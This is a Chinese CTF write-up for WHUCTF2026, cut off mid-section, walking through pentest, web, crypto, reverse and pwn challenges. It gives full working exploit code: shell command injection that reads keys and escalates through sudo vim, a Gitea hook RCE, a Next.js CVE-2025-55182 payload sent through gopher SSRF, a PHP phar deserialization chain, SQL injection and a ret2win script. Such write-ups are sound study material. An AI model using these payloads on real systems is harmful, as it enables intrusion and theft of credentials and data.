---
title: CTF辞のWHUCTF2026校赛WP
author: 1so
date: 2026-4-20
categories: 
- [CTF, WP, WHUCTF2026校赛]
tags:
  - CTF
  - WP
  - WHUCTF2026校赛
---

# CTF辞のWHUCTF2026校赛WP

队名：所以我放弃了CTF
情况：总排名第九，解题数 20，个人解题贡献 19 道，个人分数贡献 2563 分（占96.61%）
![图片](</images/CTF/WP/WHUCTF2026/76ec9deb2ffdf1ef08f006eddfb78d71.png>)
**==备注：AI 使用情况等写在文末的《/Osint/问卷调查》里了。==**

---

## Pentest
### It's myrOOt!!!!! | Tang3nt

到 `execute` 中，输入 `id` 发现回显为 `id`，输入 `$(id)` 后得到 `uid=10001(olivetin) gid=10001(olivetin) groups=10001(olivetin)`

输入 `$(cat /entrypoint.sh)`，可以得到回显
![图片](</images/CTF/WP/WHUCTF2026/Pasted_image_20260419165335.png>)

其中关键内容为：
```
FLAG_PATH="/root/flag.txt"
JUMP_KEY_PATH="/opt/pentest/runtime/jumpuser_ed25519"
JUMP_NOTE_PATH="/home/jumpuser/note.txt"
...
note="old backup note: key passphrase: ${passphrase}; local ssh port moved to 2222"
```

也就是说
- flag 在 `/root/flag.txt`
- 私钥口令会写到 `/opt/pentest/runtime/jumpuser_passphrase`
- 私钥和口令还会被写进 `/opt/pentest/runtime/schema.sql`
- SSH 到 jumpuser，再提权到 root

收集环境信息，输入 `$(ls -l /opt/pentest/runtime)`，知道这几个文件是存在的。

输入 `$(cat /opt/pentest/runtime/jumpuser_passphrase)`，得到私钥口令 `XQhJqo9kA9ap9am9dS`

输入 `$(cat /opt/pentest/runtime/schema.sql)`，得到 OPENSSH 私钥为`b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDBOeT2tx 3ijoqkPU1sd/IvAAAAEAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAILUteO6Ky0HkDp9L CaAY7WqIpDEwJKYwsJ++zvBaNV8UAAAAoAoynxm7hW0Ozye2GpHBfpKT/ASS1WmNcMGZqb ymJWhLAMiTX2A3xmX9pCcoPZwrO2nmmpRitNy2mLtI5UogpfwyUGiev3EnkW7YyR9dM3iu 9pCbb0hStwGlqlHGaurrQdQPJFzMNqIsyhVv0oz+G1VBSPynt5GkcOUcrMyoz0MgD67fOc b/DvLWh+i5M3Rg7QdGY2l+hc8XvDuCDgKaSlk=`

输入，将私钥写成文件
```
$(printf '%b' '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDBOeT2tx\n3ijoqkPU1sd/IvAAAAEAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAILUteO6Ky0HkDp9L\nCaAY7WqIpDEwJKYwsJ++zvBaNV8UAAAAoAoynxm7hW0Ozye2GpHBfpKT/ASS1WmNcMGZqb\nymJWhLAMiTX2A3xmX9pCcoPZwrO2nmmpRitNy2mLtI5UogpfwyUGiev3EnkW7YyR9dM3iu\n9pCbb0hStwGlqlHGaurrQdQPJFzMNqIsyhVv0oz+G1VBSPynt5GkcOUcrMyoz0MgD67fOc\nb/DvLWh+i5M3Rg7QdGY2l+hc8XvDuCDgKaSlk=\n-----END OPENSSH PRIVATE KEY-----\n' >/tmp/jk;
  chmod 600 /tmp/jk; echo OK)
```

输入，把私钥的口令修改为空，存在 `/tmp/jk2`
```
$(cp /tmp/jk /tmp/jk2; chmod 600 /tmp/jk2; ssh-keygen -p -P 'XQhJqo9kA9ap9am9dS' -N '' -f /tmp/jk2; echo OK)
```

输入，SSH 连接，第一次连接不弹确认，不把 `known_hosts` 留下来，用指定的私钥文件、端口去登录容器内部 SSH，之后执行命令
```
$(ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /tmp/jk2 -p 2222 jumpuser@127.0.0.1 'id; whoami; cat /home/jumpuser/note.txt; sudo -l')
```

回显
![图片](</images/CTF/WP/WHUCTF2026/Pasted_image_20260419174933.png>)

说明已经切到了 jumpuser，还差最后一步提权。jumpuser 可以执行 `sudo /usr/bin/vim` 和 `/opt/pentest/maintenance/README.md`，表示可以通过 `sudo vim` 提权到 root

输入，验证 root 的 vim 可以执行命令
```
$(ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /tmp/jk2 -p 2222 jumpuser@127.0.0.1 "printf ':set nomore\r:!id >/tmp/vim_id\r\r:q!\r' | /usr/bin/script -qfc 'sudo /usr/bin/vim /opt/pentest/maintenance/README.md' /dev/null >/dev/null 2>&1; cat /tmp/vim_id 2>&1" 2>&1)
```

输入，用 `printf '...' | ...` 把按键喂给 vim，关闭分页、把 flag 写到 `/tmp/rootflag`、退出 vim，用 script 伪造一个终端，在其中启动 sudo vim，执行喂进去的按键，最后读 flag
```
$(ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /tmp/jk2 -p 2222 jumpuser@127.0.0.1 "printf ':set nomore\r:!cat /root/flag.txt >/tmp/rootflag\r\r:q!\r' | /usr/bin/script -qfc 'sudo /usr/bin/vim /opt/pentest/maintenance/README.md' /dev/null >/dev/null 2>&1; cat /tmp/rootflag 2>&1" 2>&1)
```

flag为
```
WHUCTF{Linux_Internal_Pentest_1s_Real_World_8858527b0889}
```



## Web

### Gitea | Tang3nt

这题分两步：先用低权限账号通过 issue template 越权读仓库文件，再用拿到的管理员账号进入 Git hook 设置页，通过一次 `git push` 触发服务端命令执行。

手工复现时，先用题目给的账号登录：
```text
player / player123456
```

登录后访问下面两个地址：
```text
/sec/sec/issues/new?template=README.md
/sec/sec/issues/new?template=SECREEEEEEEET.md
```

这里虽然当前用户看不到源码，但页面会把模板内容直接加载进 issue 文本框。先从 `README.md` 里拿到隐藏文件名 `SECREEEEEEEET.md`，再读这个文件，可以得到管理员凭据：
```text
admin / HRBItGpnYyAD
```

之后切换管理员登录，进入：
```text
/sec/sec/settings/hooks/git/post-receive
```

把 hook 内容改成：
```sh
#!/bin/sh
echo "HOOK-START" >&2
for f in /flag /flag.txt /root/flag /root/flag.txt /home/git/flag /home/git/flag.txt /data/flag /data/flag.txt /app/flag /app/flag.txt; do
  if [ -f "$f" ]; then
    echo "FOUND:$f" >&2
    cat "$f" >&2
  fi
done
echo "HOOK-END" >&2
exit 0
```

之所以输出到标准错误，是为了稳定出现在 `git push` 的远端回显里。随后本地执行：
```bash
git clone http://admin:HRBItGpnYyAD@127.0.0.1:8760/sec/sec.git
cd sec
git config user.name admin
git config user.email admin@local
git commit --allow-empty -m probe-flag
git push origin main
```

如果利用成功，输出中能直接看到：
```text
remote: HOOK-START
remote: FOUND:/flag
remote: flag{704b0086-3197-4a07-9acd-7b13212d6dde}
remote: HOOK-END
```

flag：
```text
flag{704b0086-3197-4a07-9acd-7b13212d6dde}
```

### Hell City | Tang3nt

这题外面是 PHP SSRF 网关，真正要打的是容器内的 Next.js 服务。关键在于 PHP 支持 `gopher://`，所以可以伪造任意原始 HTTP 请求，去打内部 Next 的 Flight 接口，利用 `CVE-2025-55182` 拿服务端 JS 执行。

先探测外层服务：
```bash
curl -i http://127.0.0.1:10221/
curl -s 'http://127.0.0.1:10221/?url=http://127.0.0.1:80/'
curl -s 'http://127.0.0.1:10221/?url=http://127.0.0.1:80/api/health'
```

会发现真正可用的内网 Next 服务在 `127.0.0.1:80`。因为 PHP 这个网关默认只能帮我们发 GET，所以必须用：
```text
gopher://127.0.0.1:80/_
```
来发手工构造的 POST。注意外层 URL 会先被 PHP 解码一次，再交给底层请求库，因此原始 HTTP 报文需要双重 URL 编码。

下面是最小验证脚本，作用是让内部 Next 在响应头里回显 `TEST`：
```python
from urllib.parse import quote
import requests

boundary = '----WebKitFormBoundary7MA4YWxk'
code = "throw Object.assign(new Error('NEXT_REDIRECT'),{digest:'NEXT_REDIRECT;push;/x?a=TEST;307;'})//"

field0 = (
    '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
    '"value":"{\\"then\\":\\"$B1337\\"}",'
    '"_response":{"_prefix":"%s","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
) % code.replace("\\", "\\\\").replace('"', '\\"')

parts = []
parts.append(f'--{boundary}\\r\\nContent-Disposition: form-data; name="0"\\r\\n\\r\\n{field0}')
parts.append(f'--{boundary}\\r\\nContent-Disposition: form-data; name="1"\\r\\n\\r\\n"$@0"')
parts.append(f'--{boundary}\\r\\nContent-Disposition: form-data; name="2"\\r\\n\\r\\n[]')
parts.append(f'--{boundary}--')
body = '\\r\\n'.join(parts) + '\\r\\n'

req = (
    'POST / HTTP/1.1\\r\\n'
    'Host: localhost\\r\\n'
    'Connection: close\\r\\n'
    f'Content-Type: multipart/form-data; boundary={boundary}\\r\\n'
    f'Content-Length: {len(body.encode())}\\r\\n'
    'Next-Action: test-action\\r\\n'
    '\\r\\n' + body
)

gopher = 'gopher://127.0.0.1:80/_' + quote(req, safe='')
url = 'http://127.0.0.1:10221/?url=' + quote(gopher, safe=':/?=&')

resp = requests.get(url, timeout=15)
print(resp.text)
```

如果回显中出现：
```http
x-action-redirect: /x?a=TEST;push
```
说明漏洞链已经通。之后只需要替换脚本里的 `code`。

读取当前目录：
```python
code = "throw Object.assign(new Error('NEXT_REDIRECT'),{digest:'NEXT_REDIRECT;push;/x?a='+encodeURIComponent(process.cwd())+';307;'})//"
```

列根目录：
```python
code = "var fs=process.mainModule.require('fs');throw Object.assign(new Error('NEXT_REDIRECT'),{digest:'NEXT_REDIRECT;push;/x?a='+encodeURIComponent(fs.readdirSync('/').join(','))+';307;'})//"
```

最终读 flag：
```python
code = "var fs=process.mainModule.require('fs');throw Object.assign(new Error('NEXT_REDIRECT'),{digest:'NEXT_REDIRECT;push;/x?a='+encodeURIComponent(fs.readFileSync('/flag','utf8'))+';307;'})//"
```

响应头里会出现：
```http
x-action-redirect: /x?a=WHUCTF%7BwELCOmE_TO_TH3_heLl_cb4a4a57fb49%7D%0A;push
```

URL 解码后就是 flag：
```text
WHUCTF{wELCOmE_TO_TH3_heLl_cb4a4a57fb49}
```

### 世界上最好的大象 | Tang3nt

这题提示“看网页注释”，说明利用点不在表面的上传逻辑，而在遗留代码。首页源码里有：
```html
<!-- 为了兼容，保留了遗留类存在了class.php，函数在function.php -->
```

因此先直接读源码：
```bash
curl -s http://127.0.0.1:4858/class.php
curl -s http://127.0.0.1:4858/function.php
```

分析 `function.php` 可知 `view.php` 支持 `phar://...` 路径，且会调用：
```php
@exif_imagetype($normalizedPath);
```
这在 PHP 5.x 下会触发 Phar metadata 反序列化。再看 `class.php`，可以整理出 POP 链：
```text
Visitor->__destruct()
-> ShowCard->__toString()
-> LabelResolver->__invoke()
-> CacheEntry->__get()
-> TemplateEngine->__call()
-> eval($this->shell)
```

困难点在于 `TemplateEngine` 对 `shell` 有过滤，不能包含字母数字。这里用通配符绕过，payload 写成：
```php
?><?=`/???/??? /????`;?>
```

它会在 shell 中展开为：
```bash
/bin/cat /flag
```

本地构造恶意 Phar 的最小脚本如下：
```php
<?php
class Visitor { public $username = 'guest'; public $bio; }
class ShowCard { public $source; }
class LabelResolver { public $entry; public $field = 'zzz'; }
class CacheEntry { public $driver; public $cacheKey = ''; public $method = 'run'; }
class TemplateEngine { public $shell = '?><?=`/???/??? /????`;?>'; }

@unlink('/tmp/elephant.phar');
$phar = new Phar('/tmp/elephant.phar');
$phar->startBuffering();
$phar->addFromString('img.gif', base64_decode('R0lGODdhAQABAIAAAP///////ywAAAAAAQABAAACAkQBADs='));

$obj = new Visitor();
$obj->bio = new ShowCard();
$obj->bio->source = new LabelResolver();
$obj->bio->source->entry = new CacheEntry();
$obj->bio->source->entry->driver = new TemplateEngine();

$phar->setMetadata($obj);
$phar->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
$phar->setSignatureAlgorithm(Phar::MD5);
$phar->stopBuffering();
```

生成并伪装成 GIF：
```bash
php -d phar.readonly=0 make_phar.php
cp /tmp/elephant.phar /tmp/elephant.gif
```

上传：
```bash
curl -s -i \
  -F 'image=@/tmp/elephant.gif;filename=elephant.gif;type=image/gif' \
  http://127.0.0.1:4858/upload.php
```

拿到返回的上传路径后，访问：
```bash
curl -sS -i \
  'http://127.0.0.1:4858/view.php?raw=1&path=phar://uploads/20260418082331_9618.gif/img.gif'
```

响应体后半段会混入命令执行结果，末尾即可看到：
```text
WHUCTF{yOU_are_7HE_bE57_3I3pHaNt_146b93ff0c2a}
```

### 注注need | Tang3nt

入口在 `/profile` 的头像导入功能。它会服务端请求 `source_url`，并把结果保存成头像文件，因此可以直接用 `file://` 读取本地源码。

先注册普通用户登录，然后提交：
```http
POST /profile
action=remote_avatar&source_url=file:///app/app.py
```

刷新后头像路径会变成类似：
```text
/static/avatars/db6941c1ec5c9836.png
```

直接访问这个路径即可看到 `/app/app.py`。继续读：
```http
POST /profile
action=remote_avatar&source_url=file:///app/encrypt.py
```

可以确认：
```python
admin_password = os.environ.get("ADMIN_PASSWORD", "Admin#2026!Rabbit")

def encrypt_password(password: str) -> str:
    return password
```

于是直接用下面的管理员凭据登录：
```text
admin / Admin#2026!Rabbit
```

登录后访问：
```text
/admin/upload
```

页面模板会直接渲染 flag：
```text
WHUCTF{WeIcOM3_70_7HE_rA6blT_HOUSe_27fab9dfa5e4}
```

### 注注need_revenge | Tang3nt

这题前半段与上一题相同，还是靠 `file://` 读源码，但后面需要通过 SQL 注入把自己提权成 admin，再利用 ZIP 软链接读 `/flag`。

先登录普通用户，在头像导入里读取源码：
```http
POST /profile
action=remote_avatar&source_url=file:///app/app.py
```

从源码中可以看到资料更新的 SQL 直接字符串拼接，因此可以注入：
```python
query = (
    "UPDATE users SET "
    f"nickname='{nickname}', "
    f"bio='{bio}', "
    f"email='{email}' "
    f"WHERE id={user['id']}"
)
```

把昵称改成下面这个 payload：
```text
x', role='admin'#
```

对应请求可直接写成：
```http
POST /profile
action=profile&nickname=x%27%2C+role%3D%27admin%27%23&bio=&email=
```

成功后当前用户就会变成 admin。接下来在本地构造一个带软链接的 ZIP：
```bash
mkdir need_revenge_zip
cd need_revenge_zip
ln -s /flag flag.txt
zip -y need_revenge.zip flag.txt
```

这里 `zip -y` 很关键，否则会把软链接目标内容打进去，而不是保留链接本身。以管理员身份上传这个压缩包到 `/admin/upload` 后，访问：
```text
http://127.0.0.1:12961/images/flag.txt
```

即可读出：
```text
WHUCTF{Let_Us_ORdEr_a_R4661t_1fde90ee440c}}
```



## Crypto

### AIZO | Tang3nt

题目直接泄露了 `p,q`，因此可以算出：
```python
lam = lcm(p - 1, q - 1)
```

签名式为：
```text
S1 = g1^e1 * g2^e2 mod N
S2 = (h - s*S1) * e1^{-1} mod λ
S3 = (h - t*S1 - e2*S2) mod λ
```

把它改写后得到两组小未知数线性方程：
```text
h ≡ s*S1 + e1*S2 mod λ
h - S3 ≡ t*S1 + e2*S2 mod λ
```

由于 `s,t,e1,e2 < 2^250`，而 `λ` 约 511 bit，这就是标准的小根/格问题。手工复现时，先连靶机拿参数并申请一组签名：
```bash
nc 47.98.246.64 13337
```

交互里先输入：
```text
LUV ME
a
```

得到：
```text
your sign: (S1, S2, S3)
```

如果 `gcd(S2, lam) != 1` 就再签一次。之后计算：
```python
r  = S1 * inverse(S2, lam) % lam
c1 = h * inverse(S2, lam) % lam
c2 = (h - S3) * inverse(S2, lam) % lam
```

于是有：
```text
e1 + s*r ≡ c1 mod λ
e2 + t*r ≡ c2 mod λ
```

这两式都可以用二维格恢复。格基直接取：
```text
(λ, 0), (r, 1)
```

恢复出候选 `(s,e1)` 和 `(t,e2)` 后，用公开公钥筛选：
```python
pow(g1, s, N) * pow(g2, t, N) % N == pk
```

得到真实私钥 `s,t` 后，就可以自己给 `kenjaku` 伪造签名。最后提交时，自己任选可逆的 `e1,e2`，按原公式计算：
```python
h = int(sha256(b"kenjaku").hexdigest(), 16)
S1 = pow(g1, e1, N) * pow(g2, e2, N) % N
S2 = (h - s*S1) * inverse(e1, lam) % lam
S3 = (h - t*S1 - e2*S2) % lam
```

把 `(e1,e2,S2,S3)` 交给 `HATE ME` 即可。

flag 为

```text
WHUCTF{LUV-ME-HATE-ME-KILL-ME-https://www.bilibili.com/BV1pDidBpEek}
```

### Crychic-RSA | Tang3nt

关键关系是：
```text
q = p^2 + p + 1 = Φ_3(p)
```

可利用三次 cyclotomic 结构构造矩阵法分解。直接取：
```python
A = [
    [0, 0, 1],
    [1, 0, 1],
    [0, 1, 1],
]
```

然后计算：
```python
M = A^n mod n
```

对 `M - I` 的所有元素整体取 gcd，就能直接掉出 `p`。最小脚本如下：
```python
from math import gcd

def mat_mul(A, B, mod):
    return [[sum(A[i][k] * B[k][j] for k in range(3)) % mod for j in range(3)] for i in range(3)]

def mat_pow(A, e, mod):
    R = [[1,0,0],[0,1,0],[0,0,1]]
    while e:
        if e & 1:
            R = mat_mul(R, A, mod)
        A = mat_mul(A, A, mod)
        e >>= 1
    return R

M = mat_pow(A, n, n)
p = 0
for i in range(3):
    for j in range(3):
        x = (M[i][j] - (1 if i == j else 0)) % n
        p = gcd(p, x)

q = p * p + p + 1
r = n // (p * q)
phi = (p - 1) * (q - 1) * (r - 1)
d = pow(e, -1, phi)
m = pow(c, d, n)
print(m.to_bytes((m.bit_length() + 7) // 8, "big"))
```

跑出来后可得到完整分解，再正常 RSA 解密。最终 flag 为：
```text
WHUCTF{S1mpl3_f4ct0r1z4t10n_w1th_cycl0m1c_p0lyn0m14l_BV1rC41157Ci}
```

### ezLCG | Tang3nt

这题不用分解 `N`，重点是指数递推。令：
```text
t_k = m^(L^k(e)) mod N,  L(x) = (2x + 2026) mod N
```
则输出满足：
```text
s_i = t_i + t_{2i}
```

因为 `L(x) = 2x + 2026 - qN`，而这里进位 `q` 实际只会出现 `0/1` 两种，所以：
```text
t_{k+1} = C0 * t_k^2   或   C1 * t_k^2   (mod N)
```
其中：
```text
C0 = m^2026 mod N
C1 = m^(2026-N) mod N
```

先把：
```text
u0=t1, u1=t2, u2=t4, u3=t8, u4=t16
```
线性化。由 `s1,s2,s4,s8` 可得：
```text
u1 = s1 - x
u2 = s2 - s1 + x
u3 = s4 - s2 + s1 - x
u4 = s8 - s4 + s2 - s1 + x
```
其中 `x = t1`。

之后枚举较短分支前缀，利用 `s3`、`s4`、`s8`、`s9` 逐步筛。最终会恢复出唯一可行的 17 位分支：
```text
00111110100110100
```

再恢复两种系数：
```text
A = m^(2026-N) mod N
B = m^2026 mod N
```

最后利用：
```text
gcd(2026, 2026-N) = 1
```
做 Bézout 还原明文。如果 `alpha*(2026-N) + beta*2026 = 1`，则：
```python
m = pow(A, alpha, N) * pow(B, beta, N) % N
```

得到 flag：
```text
WHUCTF{Th1s_i5_a_re4lly_eas7_LCG_pr0b1em}
```

### maybe_Wiener | Tang3nt

```Python
from math import isqrt


c = 4640353323945972405587567333756911962447367346231774125060369865617631840140571335224373411764499376181563371040019628189933647339386564746727914251559717021167190277582537863057377110891810804154231518510379764349164762061682864854987321067834025578639931793733483863144837785008633112246643044094834234641831941199473862132712285063170952456578783023595969472882637161663574813104285665434923026814932593351947088259880944836224237697410438532541941823204304495503816145598398356306083830136080917957371539069236179003305527360968685496469511277872672160542847389344059045667645192804640968565347661098006757847627
e = 8925869711664293536254602790463280743603760308506333949895606365931982218910820552426976256404583292492206546362764711584430317620172342124616467959379575615120554699968276245961341947796097539609348476545129575739108904173024770423677994628015335335992787403958397205188884225599392110494029824568071570836383019857631780702084113807108723220705416286167963132119355463369756779563436048307894171012085117374094657697626086292629116792557083550670652075625174888012628706314609962385870196899561651017020024720067962045007159879342788058332124886006606916982960642980111386769354849304539381622448603860508598998387
n = 17079018232808856067759806896114156006035260880529876703723447659393496283478201040923003333160879323726172516597328180592740445782891248592832973151588182694130186175560504571057050228583199912558095180105547162773821264700567048697544514756031554953114080666328123646020447717075949675481162915086794145966045958528912457586491543973100856504194850697212533276101242655317321400312912530454494436861361594597738601281888659726708408140633053642954347870180416537472211586094132956476514970349225818899404491298095580517329113541701906189838915098526295390186689894462402334584033079700369305245153155714854636740747


def continued_fraction(num, den):
    while den:
        a = num // den
        yield a
        num, den = den, num - a * den


def convergents(cf_terms):
    p0, q0 = 0, 1
    p1, q1 = 1, 0
    for a in cf_terms:
        p0, p1 = p1, a * p1 + p0
        q0, q1 = q1, a * q1 + q0
        yield p1, q1


def long_to_bytes(value):
    if value == 0:
        return b"\x00"
    return value.to_bytes((value.bit_length() + 7) // 8, "big")


def recover_private_exponent(n, e):
    # p and q share a long high-bit prefix, so sqrt(n) is a tight estimate of both.
    phi_approx = n + 1 - 2 * isqrt(n)
    for k, d in convergents(continued_fraction(e, phi_approx)):
        if k == 0:
            continue
        ed_minus_1 = e * d - 1
        if ed_minus_1 % k != 0:
            continue
        phi = ed_minus_1 // k
        s = n - phi + 1
        delta = s * s - 4 * n
        if delta < 0:
            continue
        t = isqrt(delta)
        if t * t != delta:
            continue
        p = (s + t) // 2
        q = (s - t) // 2
        if p * q == n:
            return d
    raise ValueError("failed to recover d")


def main():
    d = recover_private_exponent(n, e)
    m = pow(c, d, n)
    print(f"d = {d}")
    print(long_to_bytes(m).decode())


if __name__ == "__main__":
    main()
```

flag 为

```text
whuctf{Now_you_truly_understand_the_Wiener_Attack!}
```

### myHash | Tang3nt

```Python
import base64
import importlib.util
import re
import socket


HOST = "127.0.0.1"
PORT = 4829
APPEND = b"&cmd=GetFlag"
KEY_LENS = [16, 24, 32, 48, 64, 12, 20, 28, 40, 56, 8] + list(range(1, 65))


spec = importlib.util.spec_from_file_location(
    "myhash_impl",
    "/mnt/c/Another USB/WHU/CTF/WHUCTF2026/Crypto/myHash/myhash.py",
)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
WHUHash128 = mod.WHUHash128
md_style_padding = mod.md_style_padding


def recv_until(sock, marker: bytes) -> bytes:
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            raise EOFError(f"connection closed before {marker!r}")
        data += chunk
    return data


def recv_line(sock) -> bytes:
    data = b""
    while not data.endswith(b"\n"):
        chunk = sock.recv(1)
        if not chunk:
            raise EOFError("connection closed mid-line")
        data += chunk
    return data


def get_token(sock):
    recv_until(sock, b"Choice> ")
    sock.sendall(b"1\n")
    line = recv_line(sock).decode().strip()
    match = re.search(r"TOKEN data=([^ ]+) sig=([0-9a-fA-F]{32})", line)
    if not match:
        raise ValueError(f"unexpected token line: {line!r}")
    recv_until(sock, b"Choice> ")
    return match.group(1), match.group(2).lower()


def submit(sock, data_b64: str, sig: str) -> str:
    sock.sendall(b"2\n")
    recv_until(sock, b"DATA_B64> ")
    sock.sendall(data_b64.encode() + b"\n")
    recv_until(sock, b"SIG> ")
    sock.sendall(sig.encode() + b"\n")
    line = recv_line(sock).decode(errors="replace").strip()
    recv_until(sock, b"Choice> ")
    return line


def forge_sig(orig_msg: bytes, orig_sig: str, guessed_key_len: int, guessed_pad: int):
    glue = md_style_padding(guessed_key_len + len(orig_msg), pad_lead=guessed_pad)
    forged_msg = orig_msg + glue + APPEND
    total = guessed_key_len + len(orig_msg) + len(glue)
    h = WHUHash128(state=bytes.fromhex(orig_sig), count=total, pad_lead=guessed_pad)
    h.update(APPEND)
    return forged_msg, h.hexdigest()


def main():
    with socket.create_connection((HOST, PORT), timeout=10) as sock:
        sock.settimeout(10)
        token_b64, token_sig = get_token(sock)
        orig_msg = base64.b64decode(token_b64, validate=True)

        seen = set()
        for guessed_key_len in KEY_LENS:
            if guessed_key_len in seen:
                continue
            seen.add(guessed_key_len)
            for guessed_pad in range(256):
                forged_msg, forged_sig = forge_sig(orig_msg, token_sig, guessed_key_len, guessed_pad)
                reply = submit(sock, base64.b64encode(forged_msg).decode(), forged_sig)
                if "flag=" in reply:
                    print(reply)
                    print(f"key_len={guessed_key_len} pad_byte={guessed_pad}")
                    return

    raise SystemExit("exploit failed")


if __name__ == "__main__":
    main()
```

flag 为

```text
WHUCTF{my_mds_1s_reall9_e4sy_r1ght?}
```

### 签到 | Tang3nt

```Python
from base64 import b16decode, b32decode, b64decode, b85decode
from hashlib import sha1
from pathlib import Path


DECODERS = (
    ("b16", lambda data: b16decode(data, casefold=False)),
    ("b32", lambda data: b32decode(data, casefold=False)),
    ("b64", b64decode),
    ("b85", b85decode),
)
ROUNDS = 16


def recover_flag(blob: bytes, rounds: int = ROUNDS) -> tuple[str, list[str]]:
    seen: set[tuple[int, bytes]] = set()

    def dfs(current: bytes, depth: int, path: list[str]):
        state = (depth, current)
        if state in seen:
            return None
        seen.add(state)

        if depth == 0:
            try:
                return current.decode(), path
            except UnicodeDecodeError:
                return None

        if len(current) < 20:
            return None

        payload = current[:-20]
        checksum = current[-20:]

        for name, decoder in DECODERS:
            try:
                decoded = decoder(payload)
            except Exception:
                continue

            if sha1(decoded).digest() != checksum:
                continue

            result = dfs(decoded, depth - 1, path + [name])
            if result is not None:
                return result

        return None

    result = dfs(blob, rounds, [])
    if result is None:
        raise ValueError("failed to recover flag")
    return result


def main() -> None:
    base_dir = Path(__file__).resolve().parent / "签到"
    blob = (base_dir / "output.txt").read_bytes()
    flag, path = recover_flag(blob)
    print(flag)
    print(" -> ".join(path))


if __name__ == "__main__":
    main()
```

flag 为

```text
whuctf{this_problem_is_easy_so_you_have_a_good_beginning!}
```



## Reverse

### checkin | Tang3nt

这题是典型的签到逆向题，重点是识别算法而不是硬推输入。通过字符串和常量表可以定位两段密钥：
```text
w31come
vvhuctf
```

再根据 S-box 和常量判断：
1. 第一层是 `AES-128-ECB`
2. 第二层是 `SM4-ECB`

密钥分别是：
```python
aes_key = b"w31come" + b"\x00" * 9
sm4_key = b"vvhuctf" + b"\x00" * 9
```

程序逻辑是“输入先 padding，再 AES，再 SM4，最后与常量密文比较”，因此直接逆着解就行。手工复现时直接把目标密文先用 SM4-ECB 解，再用 AES-ECB 解，最后去 PKCS#7 padding，就能得到原始 flag，而不需要模拟前向校验。

flag：
```text
WHUCTF{3@sy_check_1n}
```

### ez_re | Tang3nt

程序前面有几段明显像真校验的迷惑逻辑，真正的检查在一个小 VM 里。VM 每 4 字节一条指令，支持读输入、加减异或、移位、比较、条件跳转。整理后可知它检查的是 18 字节输入，并满足：
```text
((input[i] + 3) ^ 0x5a) + i = const[i]
```

常量表为：
```text
33 36 40 33 28 08 10 3f 76 35 42 17 75 45 40 36 8e eb
```

因此直接逆：
```text
input[i] = ((const[i] - i) ^ 0x5a) - 3
```

写成最小脚本就是：
```python
const = [0x33,0x36,0x40,0x33,0x28,0x08,0x10,0x3f,0x76,0x35,0x42,0x17,0x75,0x45,0x40,0x36,0x8e,0xeb]
ans = bytes((((c - i) ^ 0x5a) - 3) & 0xff for i, c in enumerate(const))
print(ans)
```

输出即为：
```text
flag{VM_1s_S0_ez!}
```

flag：
```text
flag{VM_1s_S0_ez!}
```

### Secure boot | Tang3nt

真正入口全在 `bridge.exe` 里，整体是固定命令链：
```text
open 3
auth ...
auth ...
read ...
commit ...
```

第一次 `auth` 要求 `boot:` 前缀，后面的 18 字节口令逆出来是：
```text
WHU-W31C0M3T0STM32
```
所以第一步输入为：
```text
auth boot:WHU-W31C0M3T0STM32
```

之后三步都走同一个变换函数，校验关系可以整理成：
```text
rol8(input[perm[i]] + B[i] + t + 3*i, rot_i) ^ A[i] == C[i]
```

因此逆公式为：
```text
input[perm[i]] = ror8(C[i] ^ A[i], rot_i) - B[i] - t - 3*i
```

把三种模式各自的表代进去，可得到：
```text
auth CTF-IOT-IS-FUN
read blob
commit export
```

所以手工复现不需要动态 patch 或爆破，直接完整输入：
```text
open 3
auth boot:WHU-W31C0M3T0STM32
auth CTF-IOT-IS-FUN
read blob
commit export
```

程序就会输出：
```text
flag{e16555897e2a36760705a3a009200d3d}
```

flag：
```text
flag{e16555897e2a36760705a3a009200d3d}
```

## Pwn
### ZombieSurvival | Tang3nt

程序无 PIE，因此是标准 ret2win。先从 `send_msg` 和 `handle_client` 还原包头：
```c
struct PacketHeader {
    uint32_t magic;   // "MIRR" = 0x5252494d
    uint16_t msg_id;
    uint16_t len;
};
```

握手包最小可以写成：
```text
4d 49 52 52 01 00 02 00 01 41
```

漏洞在 `handle_load_savedata -> Il2CppString_Deserialize`。它会从 payload 偏移 `0x14` 读取一个 `length`，然后把偏移 `0x18` 开始的 UTF-16 字符区逐字节写入栈缓冲区。注意它每次读 2 字节，但只取低字节，所以要把想写入的 payload 编码成：
```text
b0 00 b1 00 b2 00 ...
```

偏移计算为：
```text
0x90 + 8 = 0x98 = 152
```

可用的 ROP 很短：
```text
'A' * 152 + p64(0x40101a) + p64(0x40133b)
```

其中：
```text
ret      = 0x40101a
get_flag = 0x40133b
```

最终脚本骨架如下：
```python
from pwn import *

HOST = "127.0.0.1"
PORT = 4284

RET = 0x40101a
GET_FLAG = 0x40133b

def pkt(msg_id, data=b""):
    return p32(0x5252494d) + p16(msg_id) + p16(len(data)) + data

name = b"A"
handshake = bytes([len(name)]) + name

body = b"A" * 152 + p64(RET) + p64(GET_FLAG)
payload = b"A" * 0x14 + p32(len(body))
payload += b"".join(bytes([b, 0]) for b in body)

io = remote(HOST, PORT)
io.send(pkt(1, handshake))
io.send(pkt(2, payload))
io.interactive()
```

打通后服务端直接打印：
```text
flag{cb970907-5884-4497-b499-f160158a98c1}
```

flag：
```text
flag{cb970907-5884-4497-b499-f160158a98c1}
```

### ZombieSurvival_Server_Hard | Tang3nt

困难版多了格式化字符串泄露、PIE 和 canary，但整体利用链仍然很直。协议头仍然是：
```text
MIRR + type + length
```

先利用握手阶段的格式串漏洞扫栈。经验上在同一连接里测 `%28$p` 到 `%45$p`，能看到：
1. `%45$p` 稳定是 `handle_handshake` 返回地址
